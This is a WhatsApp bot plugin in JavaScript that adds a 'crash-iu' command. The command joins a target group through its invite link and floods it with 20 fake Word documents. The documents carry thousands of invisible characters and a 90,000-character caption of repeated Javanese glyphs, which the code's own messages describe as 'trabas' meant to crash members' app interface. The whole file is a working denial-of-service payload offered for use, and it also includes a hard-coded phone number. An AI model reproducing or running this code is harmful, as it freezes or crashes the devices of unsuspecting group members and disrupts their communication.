let handler = async (m, { conn, text }) => {
  const ownerNumber = '527447800928@s.whatsapp.net'; // 🔁 Reemplaza con tu número real
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
  }

  const descripcionBase = 'ꦾ';
  const descripcionFinal = (descripcionBase.repeat(90000)).trim();

  if (!text) return m.reply('😿 Usa: .crash-iu <enlace del grupo>');

  let match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
  if (!match) return m.reply('😡 Enlace inválido.');

  const inviteCode = match[1];
  let groupId;

  try {
    groupId = await conn.groupAcceptInvite(inviteCode);
  } catch (e) {
    groupId = `120363${inviteCode}@g.us`;
  }

  for (let i = 0; i < 20; i++) {
    const contenidoInvisible = '\u200E'.repeat(5000) + i;
    const fakeDoc = Buffer.from(contenidoInvisible);
    const fileName = `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2);

    await conn.sendMessage(groupId, {
      document: fakeDoc,
      fileName,
      mimetype: 'application/msword',
      caption: descripcionFinal
    });
  }

  await conn.reply(m.chat, '😼 20 trabas para crash iu enviados con éxito al grupo.', m);
};

handler.help = ['crash-iu <enlace del grupo>'];
handler.tags = ['tools', 'grupo'];
handler.command = ['crash-iu'];

export default handler;